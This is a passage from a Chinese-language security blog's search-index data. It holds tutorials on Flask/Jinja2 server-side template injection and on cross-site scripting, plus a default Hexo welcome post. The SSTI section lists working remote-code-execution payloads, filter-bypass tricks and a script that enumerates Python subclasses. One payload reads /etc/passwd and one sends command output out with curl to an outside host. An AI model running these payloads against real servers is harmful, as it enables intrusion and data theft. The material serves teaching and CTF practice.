的返回值；注意：该函数返回命令**执行结果的返回值**，并不是返回命令的执行输出（执行成功返回0，失败返回-1），因此需要配合 curl 外带数据查看回显          #这里画个问号 \n\n> `os.popen()`\n返回的是 file read 的对象，如果想获取执行命令的输出，则需要调用该对象的 read() 方法\n\n> 直接寻找 `os` 模块执行命令\n先编写脚本遍历Python中含有os模块的类的索引号，然后选取其中一个构造payload执行命令，脚本如下：\n```\nimport requests\n\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'\n}\n\nfor i in range(500):\n    url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\"\n\n    res = requests.get(url=url, headers=headers)\n    if 'os.py' in res.text:\n        print(i)\n```\n\n<br>\n\n用例:\n\n```\n''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('whoami')\")\nTip: 需要导入os模块\n''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('dir').read()\")\nTip: 需要导入os模块\n\n''.__class__.__mro__[-1].__subclasses__()[79].__init__.__globals__['os'].popen('dir').read()\n```\n\n我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 `os._wrap_close`，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。\n<br>\n\n>事实上，在本地python环境下，可以直接在`os._wrap_close`找到popen函数：\n`''.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']('dir').read()`\n\n【参考资料：[以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用](https://xz.aliyun.com/t/9584#toc-17)】\n\n# 三、模板注入绕过\n## 1、语法\n官方文档对于模板的部分语法介绍如下（仍然以jinja2为例：[Template Designer Documentation](https://jinja.palletsprojects.com/en/2.11.x/templates/)）\n\n>1 基本语法\n```\n{% ... %} for Statements \n可用来声明变量，也可用以循环语句和条件语句\n{{ ... }} for Expressions to print to the template output\n用于将表达式打印到模板输出\n{# ... #} for Comments not included in the template output\n表示未包含在模板输出中的注释\n#  ... # for Line Statements\n## 可以有和 {%%} 相同的效果\n```\n>2 dot(.)的绕过\n```\nYou can use a dot (.) to access attributes of a variable in addition to the standard Python __getitem__ “subscript” syntax ([]). --官方原文\n可以用 . 或者 [] 来访问变量的属性，也就是说\n{{\"\".__class__}}  等价于  {{\"\"['__classs__']}}\n```\n因此，当`.`被过滤时，我们可以使用`[]`以绕过。\n>3 如果想调用字典中的键值，其本质其实是调用了魔术方法`__getitem__`\n\n所以对于取**字典中键值**的情况不仅可以用`[]`，也可以用`__getitem__`\n```\n{{url_for.__globals__['__builtins__']}}\n{{url_for.__globals__.__getitem__('__builtins__')}}\n```\n>4 调用对象的方法，具体是调用了魔术方法`__getattribute__`\n```\n\"\".__class__\n\"\".__getattribute__(\"__class__\")\n```\n>5 **`lipsum`**\n**flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：**\n\n```\n{{lipsum.__globals__['os'].popen('ls').read()}}\n#在CTF中很好用\n```\n【参考资料：[SSTI](https://lazzzaro.github.io/2020/05/15/web-SSTI/)】\n## 2、绕过\n### Ⅰ. 字符串\n1、拼接\n```\"cla\"+\"ss\"```\n\n2、反转\n```\"__ssalc__\"[::-1]```\n\n3、编码绕过（ASCII码、Unicode编码等）\n4、利用chr函数\n因为我们没法直接使用chr函数，所以需要通过`__builtins__`找到他\n```\n{% set chr=url_for.__globals__['__builtins__'].chr %}\n{{\"\"[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}  //%2b为 + ，拼接字符串\n==>{{\"\".__class__}}\n```\n\n5、在jinja2里面可以利用`~`进行拼接\n```\n{%set a='__cla' %}{%set b='ss__'%}{{\"\"[a~b]}}\n```\n\n6、大小写过滤转换\n### Ⅱ. 过滤器\n>在模板中, 过滤器相当于一个函数, 把当前的变量传入到过滤器中, 然后过滤器根据自身功能, 再返回对应的值, 之后再把结果渲染到页面中\n基本语法: `{{ 变量 | 过滤器名称 }} `使用管道符号`|`进行组合，可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器。\n\n常用的过滤器：\n```\n1. attr\n#用于获取变量，可用于. [] 都被过滤的情况\n\"\"|attr(\"__class__\") <==> \"\".__class__\n2. format\n#格式化字符串\n\"%c%c%c%c%c%c%c%c%c\"|format(95,95,99,108,97,115,115,95,95)  \n<==>  \n\"__class__\"\n3. join\n#将一个序列拼接成一个字符串，join ('|')将令每一个元素被'|'隔开\n\"\"[['__clas','s__']|join] 或者 \"\"[('__clas','s__')|join]\n<==>\n\"\"[\"__class__\"]\n4. lower\n#转换成小写\n5. replace\n#替换字符串\n\"__claee__\"|replace(\"ee\",\"ss\") 构造出字符串 \"__class__\"\n\"__ssalc__\"|reverse 构造出 \"__class__\"\n6. string\n#将变量转换为字符串，这样就可以通过浏览器显示的符号构造出我们可利用的字符串、符号等\n().__class__   出来的是<class 'tuple'>\n().__class__|string)[0] 出来的是<\n7. list\n#转换成列表，可以与上面的string配合，就可以调用列表里面的方法取字符了\n(()|select|string|list).pop(0)\n```\n【资料查阅：[SSTI模板注入绕过（进阶篇）](https://blog.csdn.net/miuzzx/article/details/110220425)】\n### Ⅲ. 关键字绕过\n1. `.`和`[]`\n>可用过滤器`attr`绕过，若`.`可用，还可以`__getitem__`绕过`[]`。\n\n2. `\"\"`和`_`绕过\n>`request.args`、`request.values`、`request.cookies` 是 flask 中的属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来进而绕过了引号的过滤\n\n```\n{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd\n=>\n{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__\n```\n\n3. `{{}}`绕过\n>用`{%%}`的左半边绕过\n\n```{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami` ').read()=='p' %}1{% endif %}```\n\n# 四、SSTI检测\n## 1、Tplmap\n## 2、附表\n![](https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916005446865-111172183.png)\n使用标志测试。如jinja2：`{{7+8}}`，如果输出`15`，则有可能存在SSTI漏洞。\n![](https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916011329647-1428250087.png)\n<图源: https://www.cnblogs.com/icez/archive/2018/04/07/ssti_check_payload.html>","tags":["web","渗透","常见漏洞"],"categories":["渗透：从0到1"]},{"title":"XSS跨站脚本攻击","url":"/2022/12/06/XSS跨站脚本攻击/","content":"# 一、XSS 简介\nXSS（Cross Site Scripting 跨站脚本攻击），指恶意攻击者通过向网站插入恶意payload或恶意脚本，从而盗取cookie、session信息以利用用户身份进行违规操作、盗取用户资料等等。\n## 常见XSS漏洞分类\n反射型XSS\n存储型XSS\nDOM XSS\n# 二、XSS漏洞成因\n### 1、反射型XSS\n网站对于用户提交的数据没有进行过滤或转义操作（或者过滤、转义不足），导致攻击者嵌入的恶意代码被提交给服务端，服务端解析后，在相应内容中返回输入的XSS代码，最终由浏览器解释执行。\n![](https://img2022.cnblogs.com/blog/2933309/202207/2933309-20220720101405662-787659899.png)\n原型如下：\n`<?php\necho 'your input:' . $_GET['input'];\n?>`\n#### 原理解析\n若input为`<script>alert(/XSS/)</script>`\n且input值未经任何过滤便直接输出，则服务端解析后，echo语句会将客户端输入的代码**完整地输出到HTTP响应中，浏览器解析并执行**，如下图所示\n![](https://img2022.cnblogs.com/blog/2933309/202207/2933309-20220719220708564-422036808.png)\n发生弹窗，说明payload被执行。\n同理，也可以直接如下图所示构造url，当用户点击该url链接，攻击就发生了\n`http://localhost/dvwa/vulnerabilities/xss_r/?name=<script>alert(/XSS/)</script>`\n![](https://img2022.cnblogs.com/blog/2933309/202207/2933309-20220720100024888-1599748353.png)\n若将payload替换成恶意脚本，则在**用户点击**时，发生如上过程，浏览器解析并执行，达到攻击目的。\n\n### 2、存储型XSS\n反射型XSS每次皆需要用户提交代码（也即“点击”）才能进行攻击。而存储型XSS提交的XSS代码会**存储在服务器端**，下次请求该网页时无需再次提交XSS代码。常见的应用场景有留言板、在线聊天室、邮件服务等，当攻击者提交包含XSS代码的留言后，服务端会将其**存储在数据库中**，当其他用户访问网页查看留言时，服务端将从数据库中查询已有留言，并将其内容输出在HTTP响应中，由浏览器对包含恶意代码的响应解析并执行。\n![](https://img2022.cnblogs.com/blog/2933309/202207/2933309-20220720101613900-167556487.png)\n原型如下：\n```\n<?php\nif( isset( $_POST[ 'btnSign' ] ) ) {\n    // Get input\n    $message = trim( $_POST[ 'mtxMessage' ] );\n    $name    = trim( $_POST[ 'txtName' ] );\n\n    // Sanitize message input\n    $message = stripslashes( $message );\n    $message = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\n    // Sanitize name input\n    $name = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\n    // Update database\n    $query  = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $query ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n\n    //mysql_close();\n}\n?> \n```\n#### 原理解析\n攻击者提交留言`<script>alert(/XSS/)</script>`后，XSS代码被保存在 数据库中，如下图所示。\n![](https://img2022.cnblogs.com/blog/2933309/202207/2933309-20220720102803485-2027202148.png)\n并且立即执行了一次查询，XSS代码直接被触发。\n当其他用户访问网页时，服务端都将从**数据库**中查询到该XSS代码，触发执行，从而被盗取cookie（sessionid）等信息。\n\n### 3、DOM XSS","tags":["web","渗透","常见漏洞"],"categories":["渗透：从0到1"]},{"title":"Hello, Stuuupid","url":"/2022/12/05/Hello-Stuuupid/"},{"title":"Hello World","url":"/2022/12/04/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]